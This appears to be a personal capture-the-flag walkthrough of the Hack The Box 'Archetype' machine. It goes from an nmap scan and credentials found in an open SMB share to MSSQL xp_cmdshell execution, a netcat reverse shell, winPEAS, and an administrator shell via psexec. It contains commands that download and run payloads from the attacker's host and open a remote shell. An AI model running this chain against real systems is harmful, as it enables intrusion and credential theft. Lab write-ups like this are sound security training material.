### Nmap ###

─(kali㉿kali)-[~/Documents/Archetype]
└─$ nmap -p1433 -sC -A 10.129.79.20 --min-rate=1000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 05:09 EDT
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.65% done; ETC: 05:09 (0:00:00 remaining)
Nmap scan report for 10.129.79.20
Host is up (0.27s latency).

      PORT     STATE SERVICE  VERSION
      1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
      | ms-sql-info:
      |   10.129.79.20:1433:
      |     Version:
      |       name: Microsoft SQL Server 2017 RTM
      |       number: 14.00.1000.00
      |       Product: Microsoft SQL Server 2017
      |       Service pack level: RTM
      |       Post-SP patches applied: false
      |_    TCP port: 1433
      |_ssl-date: 2025-08-16T09:09:39+00:00; +5s from scanner time.
      | ms-sql-ntlm-info:
      |   10.129.79.20:1433:
      |     Target_Name: ARCHETYPE
      |     NetBIOS_Domain_Name: ARCHETYPE
      |     NetBIOS_Computer_Name: ARCHETYPE
      |     DNS_Domain_Name: Archetype
      |     DNS_Computer_Name: Archetype
      |_    Product_Version: 10.0.17763
      | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
      | Not valid before: 2025-08-16T08:14:51
      |_Not valid after:  2055-08-16T08:14:51

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2012 (93%), Windows Server 2019 (93%), Micro>
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
________________________________________________________________________________________________________________________

### SMB ### 

               smbclient -N(No password) -L(List shares) \\\\10.129.79.20\\
              
                      Sharename       Type      Comment
                      ---------       ----      -------
                      ADMIN$          Disk      Remote Admin
                      backups         Disk
                      C$              Disk      Default share
                      IPC$            IPC       Remote IPC
              
               smbclient -N \\\\10.129.79.20\\backups
              Try "help" to get a list of possible commands.
              smb: \> ls
                .                                   D        0  Mon Jan 20 07:20:57 2020
                ..                                  D        0  Mon Jan 20 07:20:57 2020
                prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020


                                        "Found some credentials in  prod.dtsConfig"  
                                        Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
________________________________________________________________________________________________________________________

### Impacket ###

    -Impacket is a collection of Python classes for working with network protocols. Impacket is
    focused on providing low-level programmatic access to the packets and for some protocols
    (e.g. SMB1-3 and MSRPC) the protocol implementation itself.

#Impacket
             https://github.com/fortra/impacket.git

#setting up
            sudo python3 setup.py install

#running                                                                                                                                                                                                      >
            python3 mssqlclient.py -h
________________________________________________________________________________________________________________________

    " Got a connection! "
pythonn3 mssqlclient.py ARCHETYPE/sql_svc@10.129.79.20 -windows-auth
Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its affiliated companies

  Password:
  [*] Encryption required, switching to TLS
  [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
  [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
  [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
  [*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
  [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
  [*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
  [!] Press help for extra shell commands
  SQL (ARCHETYPE\sql_svc  dbo@master)>
  
  #checking permissions
  SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
  -
  1
________________________________________________________________________________________________________________________

### "Getting CMD-shell..." ###

#to get a command shell
  EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:

#procedure ( step by step )
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  sp_configure;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;

# this is certainly disabled
  SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'net user';
  ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A sy>
________________________________________________________________________________________________________________________

### Got a shell! ###
  SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
  output
  -----------------
  archetype\sql_svc
  
  NULL
________________________________________________________________________________________________________________________

   " MY STUPID ASS DIDN'T PUT THE .exe FILE IN THE PYTHON SO NO MATTER HOW MANY HIT YOU GET THERE IS NO FILE SO HOW ARE YOU GOING TO GET THE SHELL?? "
                                  " MAKE SURE ALL THE THINGS YOU NEED ARE ACCESSIBLE VIA THE VICTIM  "
________________________________________________________________________________________________________________________

  ┌──(kali㉿kali)-[/var/www/html]
  └─$ ls
  index.html  index.nginx-debian.html  nc64.exe  winPEASx64.exe

  " MORE STUPIDLY MY FILE DIDN'T GET DOWNLOADED WHILE HITTING THE PYTHON SERVER BECAUSE YOU WEREN'T IN WWW "
________________________________________________________________________________________________________________________

### Downloading and executing ###

   " hit on python server! "
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://ip/nc64.exe -outfile nc64.exe"

   " hit exe file for nxc "

xp_cmdshell "cmd /c C:\Users\sql_svc\Downloads\nc64.exe -e cmd.exe ip 443"
  " Got a Hit " : 
        ─$ nc -lvnp 443
        listening on [any] 443 ...
        connect to [...ip...] from (UNKNOWN) [...target machine...] 49679
        Microsoft Windows [Version 10.0.17763.2061]
        (c) 2018 Microsoft Corporation. All rights reserved.
        C:\Windows\system32>
________________________________________________________________________________________________________________________

### Post Exploitation ###

  " changing directory "

  C:\Windows\system32>cd C:\Users\sql_svc\Desktop
  cd C:\Users\sql_svc\Desktop

  " listing directory "

  C:\Users\sql_svc\Desktop>dir
  dir
   Volume in drive C has no label.
   Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,725,150,720 bytes free
________________________________________________________________________________________________________________________

  " reading the contents "

        C:\Users\sql_svc\Desktop>type user.txt
        type user.txt
        3e7b1*****218e****f3f495*****1a3  ( hid the user flag, bruteforce if you have the skill but you don't HAHA)
________________________________________________________________________________________________________________________

### winPEAS ###
"For privilege escalation, we are going to use a tool called winPEAS , which can automate "
      "a big part of the enumeration process in the target system."

### Installation ###

  "installing winPEAS on victim system "

              C:\Users\sql_svc\Desktop>powershell -c Invoke-WebRequest http://<ip>:80/winPEASx64.exe -OutFile winPEASx64.exe
              powershell -c Invoke-WebRequest http://<ip>:80/winPEASx64.exe -OutFile winPEASx64.exe

  " Success! "

            C:\Users\sql_svc\Desktop>dir
            dir
             Volume in drive C has no label.
             Volume Serial Number is 9565-0B4F
            
             Directory of C:\Users\sql_svc\Desktop
            
            08/18/2025  09:17 AM    <DIR>          .
            08/18/2025  09:17 AM    <DIR>          ..
            02/25/2020  07:37 AM                32 user.txt
            08/18/2025  09:17 AM         1,930,752 winPEASx64.exe
                           2 File(s)      1,930,784 bytes
                           2 Dir(s)  10,721,677,312 bytes free
________________________________________________________________________________________________________________________

### Execution ###
  " executing the winPeasx64 file we downloaded on the victim system: "
    .\winPEASx64.exe

We will read the PowerShell history file, which is the equivalent of bash_history for Linux systems

**The file ConsoleHost_history.txt can be located in the directory**
  `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\` 

`We got in cleartext the password for the Administrator user which is`
 (********_*dm1n!!)
________________________________________________________________________________________________________________________

### Shell ###
  "We can now use the tool psexec.py again from the Impacket suite to " 
           " get a shell as the administrator: "

┌──(kali㉿kali)-[~/Documents/Archetype/impacket/examples]
└─$ python3 psexec.py administrator@<ip>
Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Requesting shares on <ip>.....
[*] Found writable share ADMIN$
[*] Uploading file otaZVEzk.exe
[*] Opening SVCManager on <ip>.....
[*] Creating service ENjp on <ip>.....
[*] Starting service ENjp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.
  C:\Windows\system32> 
________________________________________________________________________________________________________________________

### Exploitation ###

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

       Directory of C:\Users\Administrator\Desktop
      
      07/27/2021  02:30 AM    <DIR>          .
      07/27/2021  02:30 AM    <DIR>          ..
      02/25/2020  07:36 AM                32 root.txt
                     1 File(s)             32 bytes
                     2 Dir(s)  10,723,348,480 bytes free

C:\Users\Administrator\Desktop> type root.txt
(--GET-THIS--YOURSELF-------------) #root flag#
